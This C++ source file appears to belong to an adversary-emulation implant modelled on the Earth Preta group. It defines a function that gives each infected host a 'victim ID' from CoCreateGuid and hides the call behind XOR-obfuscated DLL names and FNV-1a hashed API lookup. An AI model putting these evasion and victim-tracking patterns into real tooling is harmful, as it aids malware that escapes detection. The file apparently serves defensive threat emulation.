#include "shellcode.hpp"
#include "util.hpp"
#include "fnv1a.hpp"

#include <al/import.hpp>

/*
 * GenerateNewVictimID:
 *      About:
 *          Generates a random GUID using the CoCreateGuid API call to use as the
 *          victim ID.
 *      Result:
 *          Populates the shellcode context with the randomly generated victim ID.
 *          Returns 0 on success, otherwise returns an error code.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
DWORD GenerateNewVictimID(sh_context* ctx) {
    // Resolve APIs
    HMODULE h_api_core_com = ctx->fp.fp_LoadLibraryW(L"api-ms-win-core-com-l1-1-0.dll"_xor);
    if (!h_api_core_com) {
        return FAIL_LOAD_API_CORE_COM;
    }

    //  ole32.CoCreateGuid is forwarded to api-ms-win-core-com-l1-1-0.CoCreateGuid)
    CoCreateGuid_t fp_CoCreateGuid = GP(h_api_core_com, CoCreateGuid, by_fnv1a);
    if (!fp_CoCreateGuid) {
        return FAIL_GET_COCREATEGUID;
    }

    return HRESULT_CODE(fp_CoCreateGuid(reinterpret_cast<GUID*>(ctx->victim_id)));
}
